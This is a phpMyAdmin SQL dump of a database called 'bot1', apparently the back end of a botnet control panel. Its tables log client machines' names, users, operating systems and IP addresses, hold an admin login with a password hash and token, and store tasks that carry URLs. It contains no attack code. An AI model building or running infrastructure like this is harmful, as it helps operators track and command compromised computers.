-- phpMyAdmin SQL Dump
-- version 4.5.1
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: Nov 15, 2016 at 10:09 PM
-- Server version: 10.1.16-MariaDB
-- PHP Version: 5.5.38

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `bot1`
--

-- --------------------------------------------------------

--
-- Table structure for table `bot_client`
--

CREATE TABLE `bot_client` (
  `id` int(11) NOT NULL,
  `uid` varchar(256) NOT NULL,
  `pc_name` varchar(512) NOT NULL,
  `user_name` varchar(512) NOT NULL,
  `os_name` varchar(256) NOT NULL,
  `ip_addr` varchar(50) NOT NULL,
  `install_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `task_id` varchar(512) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `bot_main`
--

CREATE TABLE `bot_main` (
  `id` int(11) NOT NULL,
  `user_name` varchar(256) NOT NULL,
  `passwd` varchar(256) NOT NULL,
  `time_zone` varchar(21) NOT NULL,
  `time_zone_id` int(11) NOT NULL,
  `user_token` varchar(512) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `bot_main`
--

INSERT INTO `bot_main` (`id`, `user_name`, `passwd`, `time_zone`, `time_zone_id`, `user_token`) VALUES
(1, 'admin', '$2a$08$QfkvbA/w73zbr9YfZR.p5uK7bvUnApFawguHSBxq7ualsjVywFzru', '2', 43, '3970e89ef456dead259396be26e32d52aee74992196ab026352f2e17c5c02392a50a3299bce3108daf75c6c274d63bf5e1db3adc3277c6bf78337fbdab7b572e292b63a94f497d331eac0c18dd5fceeee998335ebc4ca4b0f228b276d6de6f8004fc21425ec75d058c15b3d767694098da37ce5965b5948210eb48861fd996431fa1e3171c6262c5757d9d66b500167d64b5d0cafbfea5492471915d32321c83d4a8e81e61d6c8788c3e46cce0fdc6c8889ca780365dd760b73b4081dd5436f3e3cae606e3ecf212e3e24a4a0fc124a72c7c077f6359cf46d3ebf8af146d26058388959ff8903cd9785f5f16c36a47df1f4ecb8087696b7b59c12d7df1a58290');

-- --------------------------------------------------------

--
-- Table structure for table `bot_tasks`
--

CREATE TABLE `bot_tasks` (
  `id` int(11) NOT NULL,
  `name` varchar(256) NOT NULL,
  `comment` varchar(2048) NOT NULL,
  `url` varchar(1024) NOT NULL,
  `create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `is_limit` int(11) NOT NULL DEFAULT '0',
  `is_end` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `bot_client`
--
ALTER TABLE `bot_client`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `bot_main`
--
ALTER TABLE `bot_main`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `bot_tasks`
--
ALTER TABLE `bot_tasks`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `bot_client`
--
ALTER TABLE `bot_client`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `bot_main`
--
ALTER TABLE `bot_main`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `bot_tasks`
--
ALTER TABLE `bot_tasks`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
